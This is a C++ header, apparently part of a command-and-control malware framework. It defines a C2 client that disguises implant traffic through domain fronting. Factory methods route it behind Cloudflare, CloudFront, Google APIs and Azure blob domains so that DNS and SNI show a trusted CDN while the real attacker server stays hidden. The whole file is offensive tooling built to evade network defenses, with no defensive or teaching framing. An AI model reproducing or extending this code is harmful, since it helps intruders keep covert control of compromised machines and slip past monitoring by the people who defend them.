#pragma once

#include "C2Client.hpp"
#include "domain/common/DomainFronting.hpp"

namespace nuub::infrastructure::c2 {

// C2 Client with Domain Fronting — traffic appears to go to legitimate CDN
class FrontedC2Client : public C2Client {
    domain::DomainFronting fronting_;

public:
    // front_domain: CDN domain that appears in DNS/SNI
    // real_host: actual C2 server hostname
    // encryption_key: shared secret for AES-256-GCM
    FrontedC2Client(const std::string& front_domain,
                    const std::string& real_host,
                    const std::string& agent_id,
                    const std::string& encryption_key)
        : C2Client("https://" + front_domain, agent_id, encryption_key)
        , fronting_(front_domain, real_host) {}

    // Factory methods for popular CDNs
    static std::unique_ptr<FrontedC2Client> cloudflare(
            const std::string& c2_host,
            const std::string& agent_id,
            const std::string& encryption_key) {
        return std::make_unique<FrontedC2Client>(
            "ajax.cloudflare.com", c2_host, agent_id, encryption_key);
    }

    static std::unique_ptr<FrontedC2Client> cloudfront(
            const std::string& c2_host,
            const std::string& agent_id,
            const std::string& encryption_key) {
        return std::make_unique<FrontedC2Client>(
            "d111111abcdef8.cloudfront.net", c2_host, agent_id, encryption_key);
    }

    static std::unique_ptr<FrontedC2Client> google(
            const std::string& c2_host,
            const std::string& agent_id,
            const std::string& encryption_key) {
        return std::make_unique<FrontedC2Client>(
            "www.googleapis.com", c2_host, agent_id, encryption_key);
    }

    static std::unique_ptr<FrontedC2Client> azure(
            const std::string& c2_host,
            const std::string& agent_id,
            const std::string& encryption_key) {
        return std::make_unique<FrontedC2Client>(
            "blob.core.windows.net", c2_host, agent_id, encryption_key);
    }

    const domain::DomainFronting& fronting() const { return fronting_; }
};

} // namespace nuub::infrastructure::c2
